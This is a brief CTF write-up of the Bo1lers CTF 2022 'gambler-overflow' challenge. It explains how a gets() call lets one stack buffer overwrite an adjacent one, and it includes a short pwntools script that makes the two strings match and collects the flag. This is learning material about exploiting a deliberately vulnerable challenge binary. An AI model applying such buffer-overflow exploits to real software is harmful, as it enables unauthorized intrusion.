---
title: "[Pwn] gambler-overflow [Bo1lers CTF 2022]"
date: 2022-04-28 23:25:00
---

# 0x0 Introduction

Feeling luuuuuuuucky?

You must create a flag.txt in the same folder as the binary for it to run.
nc ctf.b01lers.com 9203

Author: robotearthpizza
Difficulty: Easy

files: [gambler_overflow](gambler_overflow)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# 0x2 Vulnerability

function `sym.casino` ask for a 4 byte string using `gets`, then it compare with a random string generate by `sym.imp.rand()`. 

If we enter the same string as the random one, we get certain amount of money. If we have more than 1000 in balance, the program will print out the flag

```
│           ; var signed int64_t var_1ch @ rbp-0x1c
│           ; var char *s2 @ rbp-0x18
│           ; var char *s1 @ rbp-0x10
│           ; var int64_t canary @ rbp-0x8
{
    do {
        // generate random string
        sym.imp.gets(&s2);
        iVar1 = sym.imp.strcmp(&s1);
        // add or subtract balance depend on the result
    } while (_obj.balance < 1000);
    sym.give_flag();
    return;
}
```

it uses `gets`, so we can overwrite s1 by s2. so that we can make s2 and s1 same.


# 0x3 Exploit

```
from pwn import *


io = start()
try:
    while True:
        lp(io.sendlineafter(b"letters: ",b"AAAAAAA\x00AAAAAAA\x00"))
except:
    pass
print(io.recv())


io.interactive()
```

# 0x4 Flag

forgot